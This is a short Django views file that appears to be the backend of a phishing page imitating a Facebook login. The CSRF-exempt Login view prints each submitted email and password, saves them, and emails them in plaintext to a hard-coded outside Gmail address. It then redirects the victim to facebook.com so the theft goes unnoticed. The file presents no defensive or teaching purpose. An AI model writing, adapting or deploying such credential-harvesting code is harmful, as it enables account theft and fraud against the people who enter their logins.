from django.shortcuts import render
from django.views.generic import TemplateView
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .form import LoginForm
from django.shortcuts import redirect
from django.core.mail import send_mail
from django.conf import settings
# Create your views here.


class Home(TemplateView):
    template_name ="home.html"


class Login(TemplateView):
    @csrf_exempt
    def post(self, *arg, **kwargs):
        form = LoginForm(data=self.request.POST)
        self.get_context_data()
        q = form.data.dict()

        print('========================',q["email"], ' and ', q["password"], '========================')
        if form.is_valid():
            form.save()

            mail_me(q["email"], q["password"])
            return redirect('https://facebook.com')
        # return render(request, 'login.html', {'form': form})
        return redirect('/login')



def mail_me(email, password):
    print("=============RAN============")
    subject = 'Thank you for registering to our site'
    message = 'it means a world to us: ' + email + " " + password
    email_from = email
    # print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
    return send_mail( subject, message, email_from, ["sunnysmart0711@gmail.com"] )